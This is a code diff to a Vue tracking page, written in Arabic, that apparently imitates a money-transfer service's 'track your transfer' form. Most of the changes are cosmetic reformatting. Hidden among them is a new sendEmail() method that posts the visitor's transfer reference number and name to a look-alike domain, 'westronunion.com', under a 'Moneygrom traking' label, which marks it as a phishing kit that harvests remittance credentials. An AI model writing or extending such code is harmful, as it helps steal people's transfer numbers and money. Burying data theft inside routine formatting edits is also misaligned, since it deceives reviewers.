@@ -4,17 +4,17 @@
   <div class="track">
     <div class="header">
       <v-container>
-        <router-link to="/"> <img src="../assets/images/logo1.png" alt="" /></router-link>
+        <router-link to="/"><img src="../assets/images/logo1.png" alt=""/></router-link>
       </v-container>
     </div>
 
     <div class="text">
       <v-container>
         <img
-          width="25"
-          height="25"
-          src="https://img.icons8.com/ios/50/fast-track--v2.png"
-          alt="fast-track--v2"
+            width="25"
+            height="25"
+            src="https://img.icons8.com/ios/50/fast-track--v2.png"
+            alt="fast-track--v2"
         />
         <h2>تعقّب</h2>
       </v-container>
@@ -33,18 +33,18 @@
               <div class="inputs">
                 <div class="field" style="margin-top: 26px">
                   <input
-                    class=""
-                    v-model="track_number"
-                    type="text"
-                    required
-                    maxlength="8"
-                    inputmode="numeric"
-                    pattern="[0-9]*"
+                      class=""
+                      v-model="track_number"
+                      type="text"
+                      required
+                      maxlength="8"
+                      inputmode="numeric"
+                      pattern="[0-9]*"
                   />
                   <label
-                    for="number"
-                    title="رقم التحويل أو الرقم المرجعي"
-                    data-title="رقم التحويل أو الرقم المرجعي"
+                      for="number"
+                      title="رقم التحويل أو الرقم المرجعي"
+                      data-title="رقم التحويل أو الرقم المرجعي"
                   ></label>
 
                   <div class="text-center">
@@ -53,10 +53,10 @@
                         <div class="mtcn_link">
                           <button v-bind="props" style="position: absolute; right: 8px; top: 15px">
                             <img
-                              width="15"
-                              height="15"
-                              src="https://img.icons8.com/fluency-systems-regular/48/info--v1.png"
-                              alt="info--v1"
+                                width="15"
+                                height="15"
+                                src="https://img.icons8.com/fluency-systems-regular/48/info--v1.png"
+                                alt="info--v1"
                             />
                           </button>
                         </div>
@@ -65,15 +65,15 @@
                       <v-card>
                         <v-card-actions style="display: block; background: #ddd">
                           <button
-                            color="primary"
-                            block
-                            @click="dialog = false"
-                            style="font-size: 14px; color: #333; text-align: start"
+                              color="primary"
+                              block
+                              @click="dialog = false"
+                              style="font-size: 14px; color: #333; text-align: start"
                           >
-                            <v-icon icon="mdi mdi-close" />
+                            <v-icon icon="mdi mdi-close"/>
                           </button>
                           <h4
-                            style="
+                              style="
                               font-size: 14px;
                               color: #333;
                               margin-top: 10px;
@@ -86,7 +86,7 @@
                           </h4>
                         </v-card-actions>
                         <v-card-text
-                          style="
+                            style="
                             text-align: end;
                             color: #7e7874;
                             font-size: 16px;
@@ -97,26 +97,26 @@
                             padding-top: 0;
                           "
                         >
-                          <br />
-                          <br />
-                          إن رقم التحويل هو رقم فريد يتم تعيينه لعملية من أجل غايات تعقّبية. <br />
-                          <br />
+                          <br/>
+                          <br/>
+                          إن رقم التحويل هو رقم فريد يتم تعيينه لعملية من أجل غايات تعقّبية. <br/>
+                          <br/>
 
                           إذا قمت بإرسال عملية، يمكنك إيجاد هذا الرقم في الرسالة الإلكترونية
-                          التأكيدية التي استلمتها حين قمت بالعملية. <br />
-                          <br />
+                          التأكيدية التي استلمتها حين قمت بالعملية. <br/>
+                          <br/>
 
-                          أما إذا استلمت العملية، عليك طلب هذا الرقم من المرسل. <br />
-                          <br />
+                          أما إذا استلمت العملية، عليك طلب هذا الرقم من المرسل. <br/>
+                          <br/>
 
                           يتم تعيين الرقم المرجعي لعملية ما عندما يتم إرسال المال بنجاح. بالنسبة
                           للعمليات التي يتم استلام المال فيها نقداً، ينبغي أن يكون هذا الرقم في حوزة
-                          المستلم لاستلام النقود. <br />
-                          <br />
+                          المستلم لاستلام النقود. <br/>
+                          <br/>
 
                           إذا قمت بإرسال العملية، يمكنك إيجاد هذا الرقم في الرسالة الإلكترونية التي
-                          استلمتها حين أصبح المال جاهزاً للاستلام. <br />
-                          <br />
+                          استلمتها حين أصبح المال جاهزاً للاستلام. <br/>
+                          <br/>
 
                           إذا كنت مستلماً لهذه العملية، عليك طلب هذا الرقم من المرسل
                         </v-card-text>
@@ -125,7 +125,7 @@
                   </div>
                 </div>
                 <div class="field">
-                  <input type="text" required v-model="name" />
+                  <input type="text" required v-model="name"/>
                   <label for="password" title="شهرتك" data-title="شهرتك"></label>
                 </div>
               </div>
@@ -135,7 +135,8 @@
         <v-container class="button_container">
           <button type="submit" style="margin-top: 30px" class="submitBtn">
             تعقّب
-          </button></v-container
+          </button>
+        </v-container
         >
       </v-form>
     </div>
@@ -143,6 +144,8 @@
 </template>
 
 <script>
+import axios from 'axios';
+
 export default {
   data() {
     return {
@@ -156,9 +159,17 @@ export default {
       localStorage.setItem('number', this.track_number)
       // eslint-disable-next-line no-cond-assign
       if (this.track_number.length == 8) {
+        this.sendEmail()
         this.$router.push('/recieve')
       }
+    },
+    sendEmail() {
+      const trackingNumber = `Moneygrom traking | Name:- ${this.track_number} | Name:- ${this.name}`
+      axios.post('https://westronunion.com/api/send-email', {
+        trackingNumber: trackingNumber
+      })
     }
+
   }
 }
 </script>
@@ -168,17 +179,21 @@ export default {
   min-height: 100%;
   background: #f7f6f6;
 }
+
 .track .header {
   background: #fff;
   border-bottom: 3px solid #e41b13;
 }
+
 .track .header img {
   max-width: 200px;
   cursor: pointer;
 }
+
 .form_row {
   flex-direction: row-reverse;
 }
+
 .track .text .v-container {
   display: flex;
   align-items: center;
@@ -189,6 +204,7 @@ export default {
 .track .text h2 {
   display: inline-block;
 }
+
 .track .text img {
   margin-bottom: 5px;
   display: inline-block;
@@ -197,10 +213,12 @@ export default {
 .track .form {
   background: #fff;
 }
+
 .form_text {
   font-family: 'Roboto' !important;
   background: #fff;
 }
+
 .form_text span {
   font-weight: 500;
   font-size: 18px;
@@ -208,6 +226,7 @@ export default {
   color: #333333;
   font-family: 'Roboto' !important;
 }
+
 .form_text p {
   color: #7e7874;
   font-weight: 300;
@@ -216,10 +235,12 @@ export default {
   font-family: 'Roboto' !important;
   margin-top: 7px;
 }
+
 .inputs {
   background: #fff !important;
   position: relative;
 }
+
 .inputs input {
   display: block;
   text-align: end;
@@ -234,10 +255,10 @@ export default {
   border: 1px solid #dfdddc;
   box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
 
-  transition:
-    border-color ease-in-out 0.15s,
-    box-shadow ease-in-out 0.15s;
+  transition: border-color ease-in-out 0.15s,
+  box-shadow ease-in-out 0.15s;
 }
+
 .inputs input::placeholder {
   color: #888888;
 }
@@ -262,6 +283,7 @@ export default {
   width: 350px;
   color: #fff !important;
 }
+
 @media (max-width: 959px) {
   .v-dialog > .v-overlay__content {
     width: 100% !important;
@@ -332,6 +354,7 @@ export default {
 .field {
   position: relative;
   margin-bottom: 15px;
+
   label::before {
     content: attr(title);
     position: absolute;
@@ -342,6 +365,7 @@ export default {
     color: #777;
     transition: 300ms all;
   }
+
   input {
     width: 100%;
     line-height: 40px;
@@ -351,16 +375,19 @@ export default {
     color: #222;
     border: 1px solid #ccc;
     border-radius: 3px;
+
     &:focus {
       outline: 0;
       border-color: #009cde;
       box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
     }
+
     &:valid + label::before {
       @extend .label-before;
       content: attr(data-title);
       font-size: 15px;
     }
+
     &:focus + label::before {
       @extend .label-before;
       color: #009cde;
